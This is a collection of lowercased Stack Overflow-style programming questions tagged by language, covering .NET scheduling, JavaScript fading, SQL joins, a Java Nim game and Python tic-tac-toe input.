convert coldfusion scheduled job to .net  below is a description of a system that works very well for running scheduled jobs in coldfusion.  if you were to build something in .net that was at least as good if not better  how would you do it   note that i m looking for concepts  ideas  and structures - not code.    we currently have a  plug and play  concept for scheduled jobs in coldfusion.  instead of several dozen individual scheduled jobs  there are a handful of scheduled job containers.  it is the containers that are actually scheduled in coldfusion.  each container is scheduled to run at a different time of day.  developers plug their individual job into the most  appropriate container based on what time they want their job to run. the container files have names like scheduledjobs_0600.cfm.    they are located in a directory not available to web browsers.  there is a separate log file associated with each.    once an individual job is ready to be scheduled  the developer plugs it into the container file like this:                   the translation is that on the 5th day of each month  coldfusion file /dwsystem/jobs/adultpsych.cfm will run.    cf_runjob is a coldfusion custom tag.  it •   trys to run the job. •   if successful  a line is written to a log file indicating when the job started and how many milliseconds it took to run. •   if unsuccessful  the catch block writes the error message to the log file    the try/catch method prevents one coding error from preventing subsequent individual jobs from running.    there are two other scheduled jobs that see how the other ones went.  specifically  they read the most recent entries in the log files and look for errors.  if any are found  all the daily events from that particular file are emailed to certain address groups. there are also two web pages available to follow up when things don t go well.  one lists all the  container  jobs and allows users to run any or all of them.  the container jobs are hard coded  but  since they are in the same directory  they could be obtained programmatically.    the second page is a little more elaborate.  it reads all the container files and all the log files.  the user is then presented with a list of all individual jobs  each one accompanied by a checkbox.  any job that failed on its previous attempt has the checkbox pre-checked.  the execution time is also shown for each job.  when the form is submitted  each selected job is run with the cf_runjob tag.    how would you do it in .net,.net

opening file with java application automatically  i want to create my own file format for a particular kind of file. when someone downloads this file i want their system to know it should be opened with my application.    for example when i download a .doc file  my computer asks me whether i want to save the file or open it with open office. similarly  if that .doc file is sitting on my desktop  and i double click it  it automatically opens with the correct application.    i believe this has to do with associating the file extension with the application in the context of the underlying os.    can any one point me to some good resources about how to do this in java     thanks.    edit: sorry i want to clarify. is there a way i can have my application associate the file type with itself when it is installed     edit: found this... <a href= http://java.sun.com/developer/technicalarticles/j2se/desktop/jdic_assoc/  rel= nofollow >http://java.sun.com/developer/technicalarticles/j2se/desktop/jdic_assoc/</a> platform independent solution,java

fade element in and run a callback  ok  i ve tried this many different ways. i m trying to learn javascript without always resorting to jquery. i m trying to create similar functionality for fading an element in and then out (using callbacks as arguments).    given this element: <code>&lt;div id= something &gt;asdf&lt;/div&gt;</code>    when i run this javascript (or something similar)  i end up either getting flickering effects (i think it s from both the <code>fadein</code> and <code>fadeout</code> functions running) or just having it fade in. more problems happen when i try to do this to several elements at once (in a for loop)  but i m guessing that  closures  will be the answer to that. one thing at a time.   <pre><code>function setopacity(element  value) {     element.style.opacity = value/100;     element.style.filter =  alpha(opacity=  + value +  ) ; }  function fadein(element  speed  callback) {     if( ! speed ) { speed = 1000; }     var speed = speed / 100;     for (var i = 0; i &lt; 100; i++) {         settimeout((function(i){ return function(){ setopacity(element  i); } })(i)  (i * speed));     }     if (callback &amp;&amp; typeof(callback) ===  function ) {         settimeout(function(){             return function() {                 callback();             }         }  (100 * speed));     } }  function fadeout(element  speed  callback) {     if( ! speed ) { speed = 1000; }     var speed = speed / 100;     for (var i = 100; i &gt; 0; i--) {         settimeout((function(i){ return function(){ setopacity(element  i); } })(i)  ((100 - i) * speed));     }     if (callback &amp;&amp; typeof(callback) ===  function ) {         settimeout(function(){             return function(){                 callback();             }         }  (100 * speed));     } }  element = document.getelementbyid( something ); element.onclick = function() {     fadein(element  1000  function() {         fadeout(element  1000  function() {             // all done         });     }); } </code></pre>,javascript
why does getdirectoryname return null for c:\   i just came across what seems like a weird design choice:   <pre><code>system.io.path.getdirectoryname(@ c:\folder\file.ext ) </code></pre>   returns  c:\folder     but   <pre><code>system.io.path.getdirectoryname(@ c:\ )  </code></pre>   returns null.    i could understand it better if the first example returned  folder .    any ideas <strong>why</strong> this is the case  and what do <em>you</em> do when you just want to get the folder path,.net

regex to replace space with char  input : <code>test 1  |  test 2   |   test 3   |   test 4</code> here the char <code>|</code> is like a delimiter.    can somebody give me regular expression or any simple way to get the string like this. and that should not affect the space between <code>test</code> and <code>3</code>.    the output should be <code>test 1|test 2|test 3|test 4</code>    there is not just one space. the spaces may be more than one.,.net

multiple inheritance in .net  do you consider .net to have multiple inheritance  why     yes  i know that by definition is doesn t  but i have had more than one person argue that since you can inherit more than one interface than it does. i know this is a very subjective question (hence the tag)  but i was hoping to get some more views on this.    <b>edit</b> i am not asking if you think it should have multiple inheritance  and i am also not saying that you inherit interface. what i was trying to get across in my question is that i have heard several people argue otherwise  and i just wanted to get some more opinions on it. i fully expected 99% of the answers to be  no   but like i said i wanted some more input.,.net

combining data from two tables into one row  i ve read around quite a bit for a solution to my problem but i can t seem to get it to work. it seems like a simple problem but i m not getting the result set i want.    i m working on a report that needs to pull from two tables and essentially create one row of data for each employee. the file needs to be uploaded to a healthcare vendor.    here is an example of the data    table1: employeecheckdeduction   <pre><code>employee id  deduction amount  check date        1234             50.00   6/30/2015        1234             50.00   7/15/2015        4567            100.00   6/30/2015        4567            100.00   7/15/2015        9876             75.00   6/30/2015        9876             75.00   7/15/2015 </code></pre>   table2: employercontribution   <pre><code>employee id  contribution amount  check date        1234                25.00   6/30/2015         1234                30.00   7/15/2015        4567                50.00   6/30/2015        4567                60.00   7/15/2015 </code></pre>   part of the problem is that not every record in table1 will have a corresponding match in table 2. if they are maxed out on contributions  they won t receive one on that pay. what i want is a result set that looks like this:   <pre><code>employee id  deduction amount  contribution amount  check date        1234             50.00                25.00   6/30/2015        1234             50.00                30.00   7/15/2015         4567            100.00                50.00   6/30/2015        4567            100.00                60.00   7/15/2015        9876             75.00                 0.00   6/30/2015        9876             75.00                 0.00   7/15/2015 </code></pre>   no matter how i try and join  it s just duplicating data. i ve tried using subqueries or distinct records and no matter what i try  it s not giving me what i want. i can t figure out what i m doing wrong.    edit. see links below for dataset results.    <a href= http://s000.tinyupload.com/index.php file_id=01551050904538574848  rel= nofollow >http://s000.tinyupload.com/index.php file_id=01551050904538574848</a>    <a href= http://s000.tinyupload.com/index.php file_id=63978789937644749322  rel= nofollow >http://s000.tinyupload.com/index.php file_id=63978789937644749322</a>    <a href= http://s000.tinyupload.com/index.php file_id=28700836121558977952  rel= nofollow >http://s000.tinyupload.com/index.php file_id=28700836121558977952</a>    i think part of the problem is that in the employee check deduction table there is a specific deduction code that i m pulling out. in the employer deduction table that code also exists. however  whenever i try and add the join on those 2 fields in addition to employee id and check date  it doesn t return results from the employees who have a deduction amount in the employee check deduction table when they don t have a corresponding record in the employer contribution table. i hope that helps.,sql

confusion with a while statement evaluating if a number is triangular  i ve been having troubles trying to figure out how to solve a function. i ve been assigned the development of a little programme which tells if a number is  triangular  (a number is triangular when the addition of certain consecutive numbers in the [1 n] interval is n. following the definition  the number 10 is triangular  because in the [1 10] interval  1+2+3+4=10).    i ve coded this so far:   <pre><code>class triangularnumber{    boolean numtriangular(int n) {     boolean triangular = false;     int i = n;     while(n&gt;=0 &amp;&amp; triangular){     //ue06 is a class which contains the function  f0   which makes the addition of all the numbers in a determined interval     ue06 p = new ue06();       if ((p.f0(1  i))==n)         triangular = true;       else         i=i-1;     }     return triangular;   }  boolean testtriangular = numtriangular(10) == true &amp;&amp;    numtriangular(7) == false &amp;&amp;    numtriangular(6) == true;    public static void main(string[] args){      triangularnumber p = new triangularnumber();     system.out.println( testtriangular =   + p.testtriangular);    }  } </code></pre>   according to those boolean tests i made  the function is wrong. as i see the function  it goes like this:    <ol> <li>i state that the input number in the initial state isn t triangular (triangular=false) and i=n (determining the interval [1 i] where the function is going to be evaluated</li> <li>while n is greater or equals 0 and the number isn t triangular  the loop starts</li> <li>the loop goes like this: if the addition of all the numbers in the [1 i] interval is n  the number is triangular  causing the loop to end. if that statement is false  i goes from i to (i-1)  starting the loop again with that particular interval  and so on till the addition is n.</li> </ol>   i can t spot the error in my  algorithm   any advice     thanks!,java

path mtu discovery  i am developing an application which processes (video processing  etc) and sends large files (up to tens of gigabytes) over a network. i am sending the files using ftp. to improve the performance/memory consumption of the application  i would like optimize the buffers so that i dont send packets which are too large and get fragmented. the problem i have is that i dont have much ram to hold the file data whilst sending. basically  i read just enough bytes from disk  process it and immediately send to the destination. currently i am looking to implement mtu path discovery.     i am familiar with the basic concept of how to do it. i would like to know if there is any .net api in windows which keeps track of the mtu to a destination      i am guessing there is no such thing  but a friend of mine told me windows vista keeps track.    i am developing this application for windows xp  but i would like to learn if there is such a network tracking api in windows.,.net

selecting the first and last value in a column in a group by query  i have a transaction level table. i am attempting to consolidate it to a acct level table. as such  i have aggregated a number of fields. however  for text based fields  i would like the first and last values for each acct.    in access there is a last function. i tried to replicate the logic of this function here:   <pre><code>select  acct  (select top 1 paiddte from trans_tbl where mstr_trans_type =  paid  and acct=acct order by dte desc) as   lastpaid   from trans_tbl group by acct </code></pre>   all this did was return the last value of the entire table in every acct record and not the last value for a sub-query for each distinct account.    anyone have any ideas on how to accomplish this  i have done it before  i just can t remember how it works.    thanks!,sql

will .net core create a new session each time i send a request to a web api   i have created one .net core spa (angular) web application  so my doubt is will this application create a new session each time i send a get or post request to a method in api controller  or will it just create a single session when i initially request for the client application.    i asked this doubt because i have to set the identity claims in my application  so i came with the confusion that  do i need to set the identity each time when i send a get or post request  or do i just need to set the identity claims only once the application is started (that is when user load the base url  login page for example.),.net

regarding delay signing   i got question about delay signing. the definition of delay signing is : --    delay signing allows you to place a shared assembly in the gac by signing the assembly with just the public key. this allows the assembly to be signed with the private key at a later stage  when the development process is complete and the component or assembly is ready to be deployed. this process enables developers to work with shared assemblies as if they were strongly named  and it secures the private key of the signature from being accessed at differen    from here few things is not clear to me. 1) how to signed assembly with the private key at a later stage after signing with public key and placed in gac.    2) why people sign any assembly with private key.    3) this process enables developers to work with shared assemblies as if they were strongly named  and it secures the private key of the signature from being accessed at differen    what does it mean   it secures the private key of the signature from being accessed at differen     please discuss. thanks,.net

what does  this  refer to in javascript parasitic inheritance   after years of creating applications using prototypal inheritance in javascript  i ve started to explore using parasitic inheritance. despite its primary pitfall - at least to me - of potentially creating several copies of methods in memory as you create an object hierarchy  i m finding that it really resonates with me with its simplicity and the fact that  new  is rendered unnecessary. however  i m stuck on what happens with  this.  most of the examples i ve seen online only scratch the surface showing how to implement parasitic inheritance like so:   <pre><code>   function foo() {        return {           method1 : function() {...}        }    }     function bar() {        var that = foo();        that.method2 = function() {            //is  this  pointing to bar()         }        return that;    } </code></pre>   as i asked in the comment in the bar() object  does  this  refer to bar() or is the scope of this relegated to method2     thanks!,javascript

improving newton s method recursion  i have solved a previous problem and now i am stuck with this one.  it is asking for an improvement of the previous solution which i posted below  but can t quite understand what the problem is asking.

using indexof() to compare characters in an array <pre><code>  function mutation(arr) {    var tester = arr[1].split(  );    for (var i = 0; i &lt; tester.length; i ++) {     if (!arr[0].indexof(tester[i])) return false;   }   return true;   }    mutation([ hello    hey ]); </code></pre>   here i should return true if the string in the first element of the array contains all of the letters of the string in the second element of the array.    i do not see any problems with this code but it passes like only 90% of the tests and i do not know why. and i can not see a pattern there — what exact conditions should i meet to fail the test.,javascript
how to iterate over numerically named object properties in defined order   in theory  the order of iteration over object properties is not guaranteed.  in practice  there is a de-facto standard about it. ie&lt;9  firefox  safari always iterate in the order of definition. opera  ie9  chrome iterate in the order of definition for string keys. numeric keys become sorted and go before string keys.    i have an object-filled array  the all keys are numbers. how can i iterate over those object properties in defined order. in ie9 and chrome  the numeric keys are always sorted before iteration.,javascript

is there a concise list of .net 3.0 to 4.0 bcl deltas   does anybody know of or have a detailed list of how the bcl in .net 4.0 has changed from 3.0   in other words  what types have been added or deprecated (or how have they changed)     all i have been able to find is the list of new features  such as the wikipedia <a href= http://en.wikipedia.org/wiki/c_sharp_(programming_language)#features_of_c.23_4.0  rel= nofollow noreferrer >article</a>  any of the endless msdn blogs entries about it  or some questions here on so (<a href= https://stackoverflow.com/questions/888893/whats-new-in-c-4-for-a-static-typed-guy >#1</a>  <a href= https://stackoverflow.com/questions/237041/confirmed-features-of-net-4-0 >#2</a>).  knowing about those is important  but i am also interested in what new types we have to use.    taking a gander using vs2010 beta 1  i noticed a few new ones that looked interesting and fun:   <ol> <li><a href= http://msdn.microsoft.com/en-us/library/system.numerics.biginteger(vs.100).aspx  rel= nofollow noreferrer ><code>biginteger</code></a></li> <li><a href= http://msdn.microsoft.com/en-us/library/dd642331(vs.100).aspx  rel= nofollow noreferrer ><code>lazy&lt;t&gt;</code></a></li> <li>the whole <a href= http://msdn.microsoft.com/en-us/library/system.collections.concurrent(vs.100).aspx  rel= nofollow noreferrer >system.collections.concurrent</a> namespace.</li> <li>additions to threading such as <a href= http://msdn.microsoft.com/en-us/library/system.threading.parallel(vs.100).aspx  rel= nofollow noreferrer >parallel</a> types and <a href= http://msdn.microsoft.com/en-us/library/system.threading.tasks(vs.100).aspx  rel= nofollow noreferrer >tasks</a> namespace</li> <li><a href= http://msdn.microsoft.com/en-us/library/system.windows.forms.datavisualization.charting(vs.100).aspx  rel= nofollow noreferrer >charting</a> namespace</li> <li>etc...</li> </ol>   i know that it is still in beta and things could change  but i think it s worth trying to get a leg up on learning about all the new classes now (not just the hyped-up ones).    i don t really feel like writing my own reflect-and-diff tool to generate this list  so i m hoping the list (or the tool to generate it) already exists.      by the way  i already checked <a href= http://www.red-gate.com/products/reflector/  rel= nofollow noreferrer >reflector</a> s <a href= http://www.codeplex.com/reflectoraddins  rel= nofollow noreferrer >add-ins</a> and the <a href= http://www.codingsanity.com/diff.htm  rel= nofollow noreferrer >diff</a> one (while being great) doesn t feel quite right.  i think it would be great for getting down to the dirty details  but seems like overkill for just getting the list of the high-level deltas.    edit:    using bdukes answer  i have created a google docs <a href= http://spreadsheets.google.com/pub key=rpsf2ykprsb2lfloarflpuw  rel= nofollow noreferrer >spreadsheet</a> that lists all the new types in 4.0 as of beta 1.  it also contains links to the msdn online documentation (or a google search for generic types since their uri is not as easy to autogenerate).,.net

storing data input by the user  i m having trouble coming up with a way to store information i want to get from a user and then return those same stats at the end of the method. the problem in question is to repeatedly ask the user to name animals and how many of said animals remain in the wild. i then want my program to store these inputs without creating a few hundred variables (the problem in question) and then print the least endangered animal when the loop is terminated.    if what i m asking is unclear  here is the fragment of code that is causing me trouble:   <pre><code>while (!animals.equalsignorecase( exterminate ))  {     animals = input( name an animal );     if (animals.equalsignorecase( exterminate ))     {      print( the least endangered animal is   + animals);      print( there are still   + numberanimals +   left in the wild );      break;     }     else     {      remaining = input( how many are left in the wild  );      numberanimals = integer.parseint(remaining);     }     } </code></pre>   i am aware that arrays are likely to solve this problem but i don t understand how i would implement one into the while loop.    edit: the essence of my problem is trying to find a way to print the least endangered animal at the end of the loop because  as it stands  the terminate code  exterminate  gets printed instead of the animal,java

is there a better reference container than a one-element array   a java anonymous class can only access a variable from the surrounding method if that variable is <code>final</code>  and hence the inner class can t write to that variable. in order to capture an object created by an enclosed type  i ve created a <code>final</code> single-element array to act as a reference:   <pre><code>    final string[] ref = new string[1];     final runnable runnable = new runnable() {         public void run() {             ref[0] =  hello world ;         }     };      runnable.run();     system.out.println(ref[0]); </code></pre>   this appears to work  and i imagine has good performance. but it feels slightly hacky.    obviously it is trivial to write a <code>ref</code> class to replace this such that:   <pre><code>    final ref&lt;string&gt; ref = new ref&lt;&gt;();     final runnable runnable = new runnable() {         public void run() {             ref.set( hello world );         }     };      runnable.run();     system.out.println(ref.get()); </code></pre>   ... is there an existing class in the standard java runtime that does this      i ve looked at <code>java.lang.ref.reference</code>  and this isn t the same thing. these are immutable  the only implementations are for weak/phantom references.,java

id fields in sql tables: rule or law   just a quick database design question: do you always use an id field in every table  or just most of them   clearly most of your tables will benefit  but are there ever tables that you might not want to use an id field       for example  i want to add the ability to add tags to objects in another table (foo).  so i ve got a table footag with a varchar field to hold the tag  and a fooid field to refer to the row in foo.  do i really need to create a clustered index around an essentially arbitrary id field   wouldn t it be more efficient to use fooid and my text field as the clustered index  since i will almost always be searching by fooid anyway   plus using my text in the clustered index would keep the data sorted  making sorting easier when i have to query my data.  the downside is that inserts would take longer  but wouldn t that be offset by the gains during selection  which would happen far more often     what are your thoughts on id fields   bendable rule  or unbreakable law     edit: i am aware that the example provided is not normalized.  if tagging is to be a major part of the project  with multiple tables being tagged  and other  extras   a two-table solution would be a clear answer.  however in this simplest case  would normalization be worthwhile   it would save some space  but require an extra join when running queries,sql

the straw picking game: helping the computer learn from its  mistakes   so i have the game already programmed. you take turns against the computer picking 1-3 straws and the point of the game is to leave the opponent with 1 straw. that entire section works  but now i have to program the computer to get smarter through consecutive play.     i m not entirely sure how this is done  however. the way it was explained to me was that you have 4  cups   which i assume are arrays. each cup contains the moves  (1  2  3). during the computer s turn it randomly picks a cup and randomly chooses one of the three moves. if that move doesn t work then it removes it from the cup.    after several games the computer should become unbeatable.i m going to keep working on this but i m having a lot of trouble. i ve been at it for a couple hours now so i ll just post the raw code without my broken parts.    edit: i ve added the cup class at the bottom.   <pre><code>import java.util.*; public class nim {    public static void main(string[] args)    {   random r = new random();   scanner kb = new scanner(system.in);   string reply;    int straws  cupnum  prevcupnum  prevcomputermove         computermove  humanmove  gamenumber = 0  humanwin = 0;    // create an array of four cups   cup[] cup = new cup[4];   for (int i = 0; i &lt; cup.length; i++)      cup[i] = new cup();     system.out.println( let s play nim );   system.out.println();   do   {      gamenumber++;      straws = r.nextint(11) + 10;        // add 1 if necessary so computer nevers starts in losing config             if (straws%4 == 1)         straws++;      system.out.println( straws to start =   + straws);      system.out.println();       // set to -1 to indicate just starting so no previous move      prevcupnum = -1;      // no prev move so init to -1      prevcomputermove = -1;       do      {         cupnum = straws%4;   // get cup number          // if cup is empty  then use 1 for move         if (cup[cupnum].count() == 0)  // cup empty then move = 1            computermove = 1;            else            computermove = cup[cupnum].select(); // get move from cup            /*missing code         if cup is cup number 1  then remove the previous move         from the previous cup unless already empty*/          system.out.println            ( computer picks up   + computermove +   straws );         straws = straws - computermove;         if (straws &lt; 0)            straws = 0;         system.out.println(straws +   left );         system.out.println();          // save this move so it can be removed later if necessary         prevcupnum = cupnum;         prevcomputermove = computermove;          if (straws == 0)         {            system.out.println( wow.  you win! );            humanwin++;             /* missing code             remove last move computer made from cup*/         }         else  // get move from human         {            system.out.println();            do            {               system.out.print( your move: enter  );                if (straws == 1)                  system.out.println( 1 );               else               if (straws == 2)                  system.out.println( 1 or 2 );               else               if (straws &gt;= 3)                  system.out.println( 1  2  or 3 );                humanmove = kb.nextint();            } while               (humanmove &gt; 3 || humanmove &lt; 1 || straws - humanmove &lt; 0);             straws = straws - humanmove;            system.out.println(straws +   left );            if (straws == 0)            {                  system.out.println();               system.out.println( ha  ha.  you lose! );            }         }      } while (straws &gt; 0);        system.out.println         ( score: human   + humanwin +     computer   +           (gamenumber - humanwin));       if (kb.hasnextline())   // get rid of stray newline         kb.nextline();      system.out.println();      system.out.println( want to play another game   hit enter. );      system.out.println         ( or are you too chicken  in that case  type in quit. );      reply = kb.nextline();      reply = reply.trim();      if (reply.length() &gt; 4)  // require only 1st 4 to be quit         reply = reply.substring(0  4);   }  while (!reply.tolowercase().equals( quit ));    } public class cup {    arraylist&lt;integer&gt; c = new arraylist&lt;integer&gt;();     public cup()    {       c.add(1);       c.add(2);       c.add(3);    }    //-----------------------    public int count()    {       return c.size();    }    //-----------------------    public int select()    {       // random is a static method in math that returns a double       // value greater than or equal to 0.0 and less than 1.0.       int index = (int)(c.size()*math.random());       return c.get(index);    }    //-----------------------    public void remove(integer move)    {          c.remove(move);    } } </code></pre>,java
compare object to empty tuple with the  is  operator in python 2.x  i m used to seeing <code>if obj is none:</code> in python  and i ve recently come across  <code>if obj is ():</code>. since tuples are not mutable  it sounds like a reasonable internal optimization in the python interpreter to have the empty tuple be a singleton  therefore allowing the use of <code>is</code> rather than requiring <code>==</code>. but is this guaranteed somewhere  since which version of the interpreter     [edit] the question matters because if () is not a singleton and there is a way of producing an empty tuple with a different address  then using <code>is {}</code> is a bug. if it is only guaranteed since python 2.x with x > 0  then it is important to know the value of x if you need to ensure backward compatibility of your code. it is also important to know if this can break your code when using pypy / jython / ironpython...,python

a method for calculating the frequency of digits  i ve written a class that finds the total of an integer by adding up the two digits. for example the digit totals of <code>0  5  12  213  999 and 1111</code> are `0  5  3  6  27 and 4 respectively. i need to write a method:    <code>public static double digittotalfrequency(int max  int digittotal)</code>    this method should <code>return</code> the proportion of numbers which have the given <code>digittotal</code> of all numbers in the range 0  1...max. eg the <code>digittotalfrequency(9  3)</code> is <code>0.1</code> since only one number out of the first 10 numbers has a digit total of 3. also  <code>digittotalfrequency(99 3)</code> is <code>0.04</code> (since out of the first 100 numbers only the numbers 3  12  21  and 30 have a digittotal of 30). i am struggling to do this  help please  thank you.   <pre><code>public static double digittotalfrequency(int max  int digittotal){      int number = max;       while (number&gt;0) {         digittotal = digittotal + (number%10);         number = number/10;       }    return digittotal/max;  }  </code></pre>,java

prompting the user for correct input - tic tac toe game  i m working on a program that simulates the tic-tac-toe game between two players. the program does what i want so far  except for the part where  i ask the players for input. i want the program to check whether the (3 x 3) grid already contains a mark (for example   x  or  o )  and keep prompting the same player for a correct input before switching turns. here is what i have so far:   <pre><code>board = [         0  1  2          3  4  5          6  7  8         ]  def main():     print_instructions()     start = str(input( your game is about to begin. press  q  if you want to quit  or  k  to proceed:  ))     while start !=  q :         get_input1()         get_input2()   def display_board(board):     print(board[0]   |    board[1]    |    board[2])     print( ---------- )     print(board[3]    |    board[4]    |    board[5])     print( ---------- )     print(board[6]    |    board[7]    |    board[8])   def print_instructions():     print( please use the following cell numbers to make your move:  )     display_board(board)   def get_input1():     userinput = input( the first player marks with a  x . type an integer between 0 up to 8 to indiciate where you want to move:  )     userinput = int(userinput)     if userinput &lt; 0 or userinput &gt; 8 or board[userinput] ==  x  or board[userinput] ==  o :         print( wrong input! you cannot move there!  )     else:         board[userinput] =  x       display_board(board)  def get_input2():     userinput = input( turn of second player. you mark with a  o . where would you like to move  type an integer between 0 and 8:  )     userinput = int(userinput)     if userinput &lt; 0 or userinput &gt; 8 or board[userinput] ==  x  or board[userinput] ==  o :         print( wrong input! you cannot move there!  )     else:         board[userinput] =  o       display_board(board)    main() </code></pre>   i still have to write the part where the program decides who the winner is  but i want to get the <code>def get_input</code> function right first. how can i check for a valid input in this case  i tried using a <code>while</code> loop  but that one just kept prompting the user indefinitely without terminating (maybe i did something wrong there). help would be appreciated.,python

how to merge multiple java classes *at runtime*   say you have an application that defines an  entity  (interface) called a  with an accompanying aimpl. and you have third-party plugins that extends the class a into b  c  .. z (with bimpl  ...)  each adding some state and functionality. you also have a  factory  in your application that creates instances of a.    i would like my  user  to load several plugins at the same time  say f  k and w  such that the factory would than create a  super a  instance that would be at the same time a f  k and w. assuming that  interface  and  implementation  are strictly separated  as long as the  super a  implements the interface of f  k and w  it should not mater that it is neither a fimpl  kimpl or wimpl. so a kind of  runtime  multiple-inheritance.    to be precise  i would not have the source code of f  k or w  and the third-party developers should not need to know about each-others extensions.    so  is there some library that makes it easy to merge java classes  ideally with some way of managing  conflicts   for example two classes defining a private method with the same signature  or trying to override the same base-class method.    note: i m looking for something using bytecode manipulation  rather than composition. composition prevents the  extending  classes of overriding methods of the base class  and use-up more memory.    [edit] as i have explained in my comment to @gray  composition is not a good solution for a number of reasons. while you can use it  if you do it properly  you end-up with very many very small classes and interfaces  and a massive amount of glue code to make them look like just one single object. this also has  in addition to a large coding overhead resulting in decreased productivity  the effect that your application uses much more memory and is also a lot slower  due to the added indirections everywhere.    for an application that processes small and short db transactions  composition might be perfect  but for an application that has to keep gigabytes of hot data in ram at all times  which is what i will be doing  this has a very real cost  both in development time  and memory and cpu requirement for the clients and servers.    a solution where you can code  naturally  (interface-first style of programming is how i normally code anyway)  with some limitation on what methods from the base-class you can extend  would be much  cheaper  than composition.,java

is it possible to add instance methods to all  classes  in javascript   this is more of an exploratory question  seeing how the core javascript stuff works.  i realize the convention is to not override any core javascript classes  but i just can t seem to wrap my head around this one.    you can create what acts like  class methods  in javascript by adding to the core <code>function</code> prototype like this:   <pre><code>function.prototype.class_method = function() {   console.log( class method called ) }  var user; user = (function() {   function user() {}   return user; })();  user.class_method(); //  class method called  </code></pre>   my question is  is there a way to add  instance methods  in a similar way   something crazy like this  but what s below doesn t work (or make any sense):   <pre><code>alias = function.prototype.constructor; function.prototype.constructor = function() {   child = this;   child.prototype.instance_method = function() {     console.log( instance method called );   }   alias.apply(child); }  var user = new user(); user.instance_method(); // method doesn t exist </code></pre>   it s almost like you d need to override the <code>function</code> class  <code>constructor</code> method and access the <code>prototype</code> from there.  is this possible     it does work if you add to the <code>object.prototype</code> like this:   <pre><code>object.prototype.instance_method = function() {   console.log( instance method ); }  var user = new user(); user.instance_method(); //  instance method called  </code></pre>   but that doesn t seem right either  mainly because seeing the output in the node.js console from <code>console.log({});</code> change is confusing:   <pre><code>console.log({}); // {};  object.prototype.instance_method = function() {   console.log( instance method ); }  console.log({}); // { instance_method : [function]} </code></pre>,javascript

count and group by semantics: why are these two different   so i m pretty new to sql and have the following two queries:   <pre><code>with contributions as (   select cc.cand_id  cc.cmte_id     from committee_contributions as cc     group by cc.cand_id  cc.cmte_id ) select c.cand_id  count(c.cand_id) as count   from contributions as c   group by c.cand_id    order by count desc </code></pre>   and    <pre><code>select cc.cand_id  count(cc.cmte_id) as count   from committee_contributions as cc   group by cc.cand_id   order by count desc </code></pre>   which give me two totally different outputs. from my understanding  the first one selects two columns and groups them by cand_id and then cmte_id  then counts the number of occurrences of each cand_id.the second one counts the number of cmte_id s associated with each cand_id. in my mind the second one should be the same as the first. could anyone enlighten me as to the difference     also  is there a better way to write the first statement without using the with or a nested query,sql

issue with using double as value in hashmap  i have a <code>double</code> as the value in hashmap with the key as a string. if i update the variable that was added as a value to the hashmap independently  instead of updating it in the hashmap  the updated value does not get reflected. that is when i use the key to get the value i get the value as 0.0 instead of the updated value. i am not able to understand why this happens. please throw some light on this. also  is there some other way of updating the value in hashmap by updating the variable. a sample code of what i am talking about is below:    <pre><code>import java.util.hashmap; public class testdouble{     public double d1 = 0.0;     public double d2 = 0.0;     public double d3 = 0.0;     private hashmap&lt;string double&gt; hm;      public testdouble(){         hm = new hashmap&lt;string double&gt;();         hm.put( d1  d1);         hm.put( d2  d2);         hm.put( d3  d3);     }      public void updated1(double d){         d1 = d;     }      public void updated2(double d){         d2 = d;     }      public void updated3(double d){         d3 = d;     }     public double getvalue(string key){         double val = (double)hm.get(key);         return val;     }      public static void main(string args[]){         testdouble td =new testdouble();         td.updated1(10.10);         td.updated2(20.20);         td.updated3(30.30);         system.out.println( value of d1 from hashmap =  +td.getvalue( d1 )+  from actual variable =  +td.d1);         system.out.println( value of d2 from hashmap =  +td.getvalue( d2 )+  from actual variable =  +td.d2);         system.out.println( value of d3 from hashmap =  +td.getvalue( d3 )+  from actual variable =  +td.d3);     } } </code></pre>   the output i get is:   <pre><code>value of d1 from hashmap = 0.0 from actual variable = 10.1 value of d2 from hashmap = 0.0 from actual variable = 20.2 value of d3 from hashmap = 0.0 from actual variable = 30.3 </code></pre>,java

availability of 32-bit .net on a 64-bit os  <strong>tldr:</strong> when installing .net on a 64-bit os  are the 32-bit components always present     i used to have my app (<a href= http://ironscheme.codeplex.com/ >ironscheme</a>) compiled entirely as <code>anycpu</code>. while this works great for all platforms  the 64-bit jit compiler just seems too slow for my liking (about 550% slower startup and about 25% slower in general). the startup slowness can be solved by ngen ng my assemblies and does in fact improve startup time another odd 500% when done so. this is gives about a 2600% improvement on startup time (3700ms vs 140ms) on 64-bit. when both 32-bit and 64-bit are ngen d  the startup times are the same  but 32-bit still performs better at runtime.    now given in most cases 64-bit is not needed at all  i think targeting x86 in the executable would just be the best general solution (all the other assemblies are targeting <code>anycpu</code>  but from what i can see  the executable determines where it goes). so the idea is to to have 2 startup executables  one targeting x86  the other x64 (or amd64 as ms calls it).    when installing on a 32-bit os  i can be sure no 64-bit components are present. but what about the opposite case  does the .net installer install both 32-bit and 64-bit components  this is important as ngen ng a non-anycpu assembly will fail if the target does not match the runtime.    example:     <em> error compiling ironscheme.console.exe: this version of  is not compatible with the version of windows you re running. </em>    also note that my application is built by default for .net 2 and in vs2008  so the new <code>anycpu (32-bit preferred)</code> option (in vs2012/.net 4.5) is not an option for me at this time.    ps: sorry  if this has been asked before. i have no idea how to search for this specific issue  and my google fu failed me too.,.net
can you implement ienumerable .contains compatibility for your class   if for example  i have a class called  banana  and i make a list of its instances  say  bananas  then when i call bananas.contains(&lt; some instance of banana >) it checks if the banana list contains the same reference.    is it possible to make it check for the value instead though (whatever i might designate as the value to compare)  sort of like it works with list(of string),.net

application.userappdataregistry and version number  *or:  where the <em>%#%¤/ am i supposed to store my settings  </em>    why is the product version number included in the application.userappdataregistry registry key  i think it s really annoying.    doesn t this just encourage developers to stick with version number 1.0.0 forever  since changing the version number will cause the user to loose all settings (unless extra effort is made)     if i strip away the version number  it will of course work  better  (the way i see it)  but the framework still creates the registry key with the version number.    what am i overseeing,.net

